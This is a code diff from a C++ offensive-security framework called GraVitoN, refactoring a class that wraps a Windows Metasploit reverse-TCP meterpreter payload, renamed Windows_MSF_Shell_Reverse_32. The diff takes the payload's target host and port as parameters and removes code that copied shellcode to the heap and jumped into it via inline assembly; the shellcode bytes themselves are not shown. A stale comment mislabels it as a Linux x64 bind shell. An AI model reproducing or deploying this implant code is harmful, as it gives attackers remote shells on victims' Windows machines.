@@ -19,21 +19,25 @@
  * You should have received a copy of the GNU General Public License
  * along with Graviton.  If not, see http://www.gnu.org/licenses/.
  *
- * @brief GraVitoN::Payload_Meter_Win32r 
+ * @brief GraVitoN::Windows_MSF_Shell_Reverse_32
  *
 */
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-#ifndef _GVN_PAYLOAD_METER_WIN32R_HEAD_
-#define _GVN_PAYLOAD_METER_WIN32R_HEAD_
+#ifndef _GVN_Windows_MSF_Shell_Reverse_32_HEAD_
+#define _GVN_Windows_MSF_Shell_Reverse_32_HEAD_
 
-#include "../gvn_payload.hpp"
+#include <payload/payload.hpp>
 
 #include <cstdio>
 #include <cstdlib>
 
 
-using namespace GraVitoN;
+namespace GraVitoN
+{
+
+namespace Payload
+{
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 /**
@@ -41,17 +45,21 @@ using namespace GraVitoN;
  *
  * This payload is a bind shell for linux x64.
  */
-class Payload_Meter_Win32r : public GraVitoN::Bin_Payload
+class Windows_MSF_Shell_Reverse_32 : public Payload::Binary_Payload
 {
+private:
+    unsigned int port;
+    string host;
+
 protected:
 	virtual bool initPayload();
 	
 public:
 	/// Constructor
-    Payload_Meter_Win32r ();
+    Windows_MSF_Shell_Reverse_32 ();
 
 	/// Destructor
-    virtual ~Payload_Meter_Win32r ();
+    virtual ~Windows_MSF_Shell_Reverse_32 ();
 
 	/**
 	 * @brief Initialize
@@ -60,33 +68,23 @@ public:
 	 * Listening Port ( "Port=7357" )
 	 *
 	 */
-    virtual bool initialize ( const string &_options );
-
-	/// @see Payload::run()
-    virtual bool run();
+    virtual bool initialize ( const string &remote_ip, const unsigned int &remote_port );
 };
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Payload_Meter_Win32r ::Payload_Meter_Win32r ()
+Windows_MSF_Shell_Reverse_32 ::Windows_MSF_Shell_Reverse_32 ()
 {
    jumper = _null_;
-   GraVitoN::Logger::logItLn ( "Sample -> done" );
+   Core::Logger::logItLn ( "Sample -> done" );
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Payload_Meter_Win32r ::~Payload_Meter_Win32r ()
+Windows_MSF_Shell_Reverse_32 ::~Windows_MSF_Shell_Reverse_32 ()
 {
 }
 
-bool Payload_Meter_Win32r ::initPayload()
-{
-	int port = 7357;
-	string host;
-	/// Parse options
-	OptParser::getValueAsInt(options, "PORT", port);
-	OptParser::getValueAsString(options, "HOST", host);
-	Logger::logVariable("HOST", host);
-	
+bool Windows_MSF_Shell_Reverse_32 ::initPayload()
+{	
 	/*
 	 * windows/meterpreter/reverse_tcp - 290 bytes (stage 1)
 	 * http://www.metasploit.com
@@ -142,43 +140,18 @@ bool Payload_Meter_Win32r ::initPayload()
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Meter_Win32r ::initialize ( const string &_options )
+bool Windows_MSF_Shell_Reverse_32 ::initialize(const string &remote_ip, const unsigned int &remote_port)
 {
-	options = _options;
+    port = remote_port;
+    host = remote_ip;
 
-    Logger::logIt ( "init payload... " );
+    Core::Logger::logIt ( "init payload... " );
     initPayload();
-    Logger::logItLn ( "done" );
-
-	/// Copy payload to heap
-    jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
-    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );
+    Core::Logger::logItLn ( "done" );
 
     return true;
 }
 
-//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Meter_Win32r ::run()
-{
-    /// A Little Delay!
-    int _delay = 320;
-    while ( _delay > 0 ) {
-        --_delay;
-    }
-
-    /// Jumping to starting address of payload
-    int useless_out = 0;
-    Logger::logItLn ( "Jumping on Payload..." );
-    asm (
-        "mov %1, %%ebx;"
-        "jmp *%%ebx;"
-        : "=r" ( useless_out )
-        : "r" ( jumper )
-        : "%ebx"
-    );
-    Logger::logItLn ( "call -> done" );
-
-    return true;
 }
-
-#endif // _GVN_PAYLOAD_METER_WIN32R_HEAD_
+}
+#endif // _GVN_Windows_MSF_Shell_Reverse_32_HEAD_
